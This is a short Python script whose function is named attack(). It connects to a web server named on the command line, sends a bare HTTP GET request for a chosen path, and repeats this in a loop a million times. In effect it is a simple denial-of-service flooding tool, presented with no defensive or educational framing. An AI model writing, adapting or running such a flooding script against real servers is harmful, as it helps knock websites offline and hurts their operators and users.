import socket, sys, os  

def attack():  
 
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  
    s.connect((sys.argv[1], 80))  # might give argv[3] for port if needed.
    
    print ">> GET " + sys.argv[2]+ " HTTP/1.1"  
    s.send("GET " + sys.argv[2] + " HTTP/1.1\r\n")  
    s.send("Host: " + sys.argv[1]  + "\r\n\r\n");  
    s.close()  
    
for i in range(1, 1000000):  
    attack()  
